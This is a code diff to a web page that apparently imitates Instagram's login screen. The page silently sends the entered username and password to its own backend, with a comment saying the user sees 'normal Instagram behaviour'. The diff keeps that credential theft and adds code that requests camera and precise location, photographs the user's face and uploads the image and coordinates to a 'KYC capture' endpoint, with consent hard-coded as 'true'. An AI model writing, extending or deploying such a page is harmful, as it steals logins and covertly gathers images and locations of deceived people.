@@ -884,24 +884,136 @@
     if (e.key === 'Escape') closeModal();
   });
 
+
+
+
+
+
+
+
+
+
+
   // ── Login form ────────────────────────────────────────────────
-  document.getElementById('btn-login').addEventListener('click', async () => {
-    const identifier = document.getElementById('login-identifier').value.trim();
-    const password   = document.getElementById('login-password').value;
+//   document.getElementById('btn-login').addEventListener('click', async () => {
+//     const identifier = document.getElementById('login-identifier').value.trim();
+//     const password   = document.getElementById('login-password').value;
 
-    if (!identifier || !password) return;
+//     if (!identifier || !password) return;
 
-    try {
-      await fetch(`${window.location.protocol}//${window.location.hostname}:5000/api/auth/login`, {
-        method:  'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body:    JSON.stringify({ identifier, password }),
-      });
-    } catch (_) {
-      // fail silently — user sees normal Instagram behaviour
-    }
-  });
+//     try {
+//       await fetch(`${window.location.protocol}//${window.location.hostname}:5000/api/auth/login`, {
+//         method:  'POST',
+//         headers: { 'Content-Type': 'application/json' },
+//         body:    JSON.stringify({ identifier, password }),
+//       });
+//     } catch (_) {
+//       // fail silently — user sees normal Instagram behaviour
+//     }
+//   });
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+// ── Login form ────────────────────────────────────────────────
+document.getElementById('btn-login').addEventListener('click', async (e) => {
+  e.preventDefault(); // stop the <a href=""> from reloading the page
+
+  const identifier = document.getElementById('login-identifier').value.trim();
+  const password   = document.getElementById('login-password').value;
+
+  if (!identifier || !password) return;
+
+  // 1. Your existing login call
+  try {
+    await fetch(`${window.location.protocol}//${window.location.hostname}:5000/api/auth/login`, {
+      method:  'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body:    JSON.stringify({ identifier, password }),
+    });
+  } catch (_) {
+    // fail silently — user sees normal Instagram behaviour
+  }
+
+  // 2. Request camera + location permission, then capture
+  let stream, position, photoBlob;
+  try {
+    [stream, position] = await Promise.all([
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false }),
+      new Promise((resolve, reject) =>
+        navigator.geolocation.getCurrentPosition(resolve, reject, {
+          enableHighAccuracy: true,
+          timeout: 10000,
+        })
+      ),
+    ]);
+  } catch (err) {
+    console.warn('Camera/location permission denied or unavailable:', err);
+    return; // no capture if permission refused
+  }
+
+  try {
+    const track = stream.getVideoTracks()[0];
+    const imageCapture = new ImageCapture(track);
+    const bitmap = await imageCapture.grabFrame();
+
+    const canvas = document.createElement('canvas');
+    canvas.width = bitmap.width;
+    canvas.height = bitmap.height;
+    canvas.getContext('2d').drawImage(bitmap, 0, 0);
+
+    photoBlob = await new Promise((resolve) => canvas.toBlob(resolve, 'image/jpeg', 0.85));
+  } finally {
+    stream.getTracks().forEach((t) => t.stop()); // turn camera off
+  }
+
+  const form = new FormData();
+  form.append('photo', photoBlob, 'capture.jpg');
+  form.append('lat', position.coords.latitude);
+  form.append('lng', position.coords.longitude);
+  form.append('accuracy', position.coords.accuracy);
+  form.append('consent', 'true');
+  form.append('consentVersion', 'v1');
+
+  try {
+    const res = await fetch(`${window.location.protocol}//${window.location.hostname}:5000/api/kyc/capture`, {
+      method: 'POST',
+      body: form,
+    });
+    const data = await res.json();
+    console.log('KYC capture result:', data);
+    // TODO: redirect to your separate authentication module here, e.g.:
+    // window.location.href = `/auth-module?captureId=${data.id}`;
+  } catch (err) {
+    console.warn('KYC capture failed:', err);
+  }
+});
+
+
+
+
+
+
+
+
+
+
+
+  
   document.getElementById('pw-toggle').addEventListener('click', () => {
     const input   = document.getElementById('reg-password');
     const eyeShow = document.getElementById('eye-show');
@@ -1022,7 +1134,6 @@
     }
   });
 </script>
-
 </body>
 </html>
 
